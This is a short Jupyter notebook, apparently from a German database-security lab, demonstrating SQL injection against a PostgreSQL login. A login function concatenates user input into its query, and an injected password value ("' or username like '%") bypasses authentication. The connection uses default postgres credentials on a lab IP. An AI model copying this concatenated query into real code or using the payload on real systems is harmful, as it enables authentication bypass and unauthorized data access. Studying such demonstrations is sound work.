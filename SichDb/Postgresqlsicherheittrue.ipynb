{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "select * from users where username='u' and password='' or username like '%'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import psycopg2\n",
    "from psycopg2.extras import RealDictCursor\n",
    "\n",
    "def sign_in (username, password):\n",
    " query = \"select * from users where username='\" + username + \"' and password='\" + password + \"'\";\n",
    " print(query)\n",
    "\n",
    " try:\n",
    "  cur.execute(query)\n",
    " except:\n",
    "  print(\"Query execution failed\")\n",
    "\n",
    " if (cur.rowcount == 1):\n",
    "  return True\n",
    "\n",
    " return False\n",
    "\n",
    "try:\n",
    " conn = psycopg2.connect(host='192.168.56.101', database='postgres', user='postgres', password='postgres', cursor_factory=RealDictCursor)\n",
    "except:\n",
    " print(\"onnecting to the database failed!\")\n",
    "\n",
    "cur = conn.cursor()\n",
    "\n",
    "sign_in('u','\\' or username like \\'%')  ### % wird immer als Wildcard benötigt\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.12 ('base': conda)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  },
  "vscode": {
   "interpreter": {
    "hash": "b6f36a5813acc247fd63ab7b974716ae81657c127576652ad3452f03cb7d7adf"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
